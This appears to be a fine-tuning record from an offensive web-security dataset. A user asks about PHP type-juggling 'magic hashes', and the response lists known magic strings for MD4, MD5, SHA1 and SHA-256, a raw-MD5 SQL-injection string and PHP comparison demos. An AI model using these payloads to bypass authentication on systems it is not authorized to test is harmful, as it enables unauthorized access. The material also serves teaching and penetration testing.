# AUTH — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: auth
- cwe: CWE-697

## Scenario

Explain the Magic Hashes technique for Type Juggling and list the concrete payloads I can try.

## Analysis / Response

**Magic Hashes** — this technique applies to Type Juggling. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

> Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations.

| Hash | "Magic" Number / String                 | Magic Hash                       | Found By / Description                                                  |
| ---- | --------------------------------------- | -------------------------------- | ----------------------------------------------------------------------- |
| MD4  | gH0nAdHk                                | 0e096229559581069251163783434175 | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md)            |
| MD4  | IiF+hTai                                | 00e90130237707355082822449868597 | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md)            |
| MD5  | 240610708                               | 0e462097431906509019562988736854 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                                 | 0e830400451993494058024219903391 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905                            | 0e291659922323405260514745084877 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                             | 0e291242476940776845150308577824 | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928 | 06da5430449f8f6f23dfc1276f722738 | Raw: ?T0D??o#??'or'8.N=?                                                |

| Hash    | "Magic" Number / String | Magic Hash                                                       | Found By / Description                                                           |
| ------- | ----------------------- | ---------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| SHA1    | 10932435112             | 0e07766915004133176347055865026311692244                         | Michael A. Cleverly, Michele Spagnuolo & Rogdham                                 |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636         | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083)   |

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```
